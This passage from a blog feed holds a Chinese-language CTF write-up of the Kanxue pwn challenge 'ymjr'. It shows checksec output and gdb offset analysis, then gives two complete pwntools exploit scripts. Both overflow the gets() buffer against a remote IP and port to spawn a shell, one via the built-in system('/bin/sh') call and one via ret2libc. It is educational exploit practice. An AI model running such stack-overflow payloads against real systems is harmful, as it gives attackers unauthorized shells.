class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec ymjr </span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Kanxue/1/pwn/YMJR/ymjr&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>该ELF文件只开启了栈不可执行保护</p></blockquote><p><img src="/images/134-1.png" alt></p><blockquote><p>从上图的IDA中可以看出，gets()函数中的变量<code>v4</code>在栈中被分配的空间为<code>0x64</code>，但是在后面的exp.py文件中构造成功了，但是没有成功得到flag，于是我去gdb中调试了一下，如下图：</p></blockquote><p><img src="/images/134-2.png" alt></p><blockquote><p>从上图中可以看出，v4距<code>esp</code>的距离有<code>0x1c</code>，esp中的地址为<code>0xffffd860</code>，那么v4的地址为<code>0xffffd87c</code>。这个时候ebp中地址为<code>0xffffd8e8</code>，那么<code>v4</code>与<code>ebp</code>的距离为<code>0xffffd8e8-0xffffd87c=108（0x6c）</code>，示意图如下：</p></blockquote><p><img src="/images/134-3.png" alt></p><h3 id="font-color-navy0x01-姿势一font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-姿势一font"></a> <font color="navy"><code>0x01 姿势一</code></font></h3><blockquote><p>直接让返回地址跳转到<code>system(&quot;/bin/sh&quot;)</code>处</p></blockquote><p>     我们先看看程序中有没有可以直接利用的shell，在IDA中查找一下，发现在secure()函数中发现了<code>system(&quot;/bin/sh&quot;)</code>，如下图：</p><p><img src="/images/134-4.png" alt></p><p>      那么我们是否可以将main函数的返回地址填充为<code>system(&quot;/bin/sh&quot;)</code>函数的地址呢？下面我们来进行尝试我们开始写exp，不过请放心，我会详细的介绍每一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">shell_addr = <span class="number">0x804863A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(shell_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>执行结果如下：</p></blockquote><p><img src="/images/134-5.png" alt></p><h3 id="font-color-navy0x02-姿势二font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-姿势二font"></a> <font color="navy"><code>0x02 姿势二</code></font></h3><p>      第二种姿势和第一种差不多，只不过是自己构造shell，需要我们自己查找字符串<code>/bin/sh</code>的地址，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary ymjr --string &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048763 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ymjr"</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x08048763</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(system_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># system函数的返回地址，我们并不管执行system函数以后的返回地址</span></span><br><span class="line">payload += p32(bin_sh_addr)<span class="comment"># system函数的参数/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;      这道题目真的太坑了，不过也给我提了一个醒，就是&lt;code&gt;在做题时不能对IDA pro反编译的伪代码过于相信&lt;/code&gt;，在感觉有问题的地方，一定自己用&lt;code&gt;GDB&lt;/code&gt;调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="看雪CTF" scheme="https://muzibing.github.io/tags/%E7%9C%8B%E9%9B%AACTF/"/>
    
  </entry>
  
</feed>
